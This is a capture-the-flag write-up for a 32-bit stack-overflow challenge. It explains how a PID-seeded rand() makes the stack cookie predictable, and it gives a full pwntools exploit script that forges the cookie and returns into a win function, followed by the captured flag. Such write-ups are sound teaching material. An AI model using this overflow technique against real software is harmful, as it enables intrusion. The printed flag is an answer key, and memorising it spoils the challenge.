---
layout: post
title: "SHC 2026: Jurassic Stack Park - Stack Overflow with Predictable Cookie"
date: 2026-05-08
tags: [pwn]
---

## Challenge Overview

| Property | Value |
|---|---|
| Binary | `stackosaurus` (ELF32, x86, statically linked, not stripped) |
| Category | pwn / sourceless |
| Protections | No PIE · No canary · NX off · Partial RELRO |

No source code provided. Goal: read `/flag` off the server.

## Recon

```bash
file stackosaurus
# ELF 32-bit LSB executable, Intel 80386, statically linked, not stripped

readelf -l stackosaurus | grep GNU_STACK
# GNU_STACK  RW  0x10   (NX bit NOT set — executable stack)

nm stackosaurus | grep ' T ' | head
# 08049865 T open_enclosure   — win function
# 0804991f T register_dino    — vulnerable function
```

Key strings found:

```
/flag
Terminal PID    : %d      — PID leak in banner
ACCESS DENIED, invalid containment credentials.
```

## Static Analysis

### open_enclosure — Win Function

Never called during normal execution. Requires two magic arguments:

```
0x804987a: cmpl $0xd1a0d1a0, 0x8(%ebp)   ; check arg1
0x8049881: jne  ACCESS_DENIED
0x8049883: cmpl $0xc0dec0de, 0xc(%ebp)   ; check arg2
0x804988a: jne  ACCESS_DENIED
0x804989d: call fopen("/flag", "r")
0x80498f4: call puts(buf)                 ; print flag
```

### register_dino — Vulnerable Function

```
sub   $0x54, %esp             ; 84 bytes of locals
mov   0x13dc(%ebx), %eax     ; load global rand() value
mov   %eax, -0xc(%ebp)       ; save as stack "cookie"

lea   -0x4c(%ebp), %eax      ; buffer at EBP-0x4C (76 bytes)
push  $0x100                  ; read UP TO 256 bytes  — OVERFLOW
push  %eax
call  read

; Cookie check
mov   -0xc(%ebp), %edx
cmp   %eax, %edx              ; compare saved vs global
je    SUCCESS
call  exit(1)
```

**Overflow:** `read(0, buf, 0x100)` into a 76-byte buffer = 180 bytes of overflow.
**Obstacle:** Stack cookie must match or program exits.

### The Cookie Is Predictable

`main()` seeds with the PID, then stores the first `rand()` output:

```
call  getpid()
call  srand(pid)
call  rand()
mov   %eax, global    ; 0x810f3dc
```

The banner prints: `Terminal PID    : 22`

Since there is no PIE and no ASLR on the binary, we can reproduce `rand(pid)` exactly using Python ctypes.

## Exploitation

### Stack Layout

| Offset | Content | Location | Notes |
|---|---|---|---|
| 0–63 | `A * 64` | EBP-0x4C…EBP-0x0D | Padding |
| 64–67 | `rand(pid)` | EBP-0x0C | **Forged cookie** |
| 68–71 | `0x42424242` | EBP-0x08 | Unused gap |
| 72–75 | `0x43434343` | EBP-0x04 | Saved EBX |
| 76–79 | `0x44444444` | EBP+0x00 | **Saved EBP — do not skip** |
| 80–83 | `0x08049865` | EBP+0x04 | **Return address — open_enclosure** |
| 84–87 | `0x41414141` | EBP+0x08 | Dummy return for open_enclosure |
| 88–91 | `0xd1a0d1a0` | EBP+0x0C | arg1 |
| 92–95 | `0xc0dec0de` | EBP+0x10 | arg2 |

### The Critical Epiphany — Off-By-One-Dword

Early attempts produced "Specimen registered successfully" but no flag. The connection closed silently.

Root cause: `open_enclosure`'s address was at offset 76 (saved EBP slot) instead of offset 80 (return address). Adding one extra dword of padding for saved EBP shifted everything into place. Payload grew from 92 to 96 bytes.

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *
import ctypes, re

OPEN_ENCLOSURE = 0x08049865
ARG1           = 0xd1a0d1a0
ARG2           = 0xc0dec0de

_libc = ctypes.CDLL('libc.so.6')
def predict_rand(pid):
    _libc.srand(pid)
    return _libc.rand()

p = remote('<host>', 31337, ssl=True)
banner   = p.recvuntil(b'  > ', timeout=15)
pid      = int(re.search(rb'Terminal PID\s*:\s*(\d+)', banner).group(1))
rand_val = predict_rand(pid)

p.sendline(b'1')
p.recvuntil(b'Specimen name:', timeout=5)

payload  = b'A' * 64
payload += p32(rand_val)        # forged cookie
payload += b'B' * 4             # gap
payload += b'C' * 4             # saved EBX
payload += b'D' * 4             # saved EBP  — critical
payload += p32(OPEN_ENCLOSURE)  # return address
payload += p32(0x41414141)      # dummy ret for open_enclosure
payload += p32(ARG1)
payload += p32(ARG2)

p.send(payload)
p.interactive()
```

**Flag:** `dach2026{l1f3_f1nd5_a_w4y_p4st_th3_f3nc3_8b2e4a91c3_e4f730e89d60}`

## Key Epiphanies

1. **The cookie is not a canary** — predictable via PID leak + deterministic srand
2. **Silent crash diagnosis** — "success" message with no flag means wrong offset, not timing
3. **Count dwords not bytes** — between the cookie and return address are exactly three saved dwords
4. **32-bit ret2func argument layout** — no `call` instruction = no hardware-pushed return address; arguments are at EBP+0x08 and EBP+0x0C after the function's own prologue
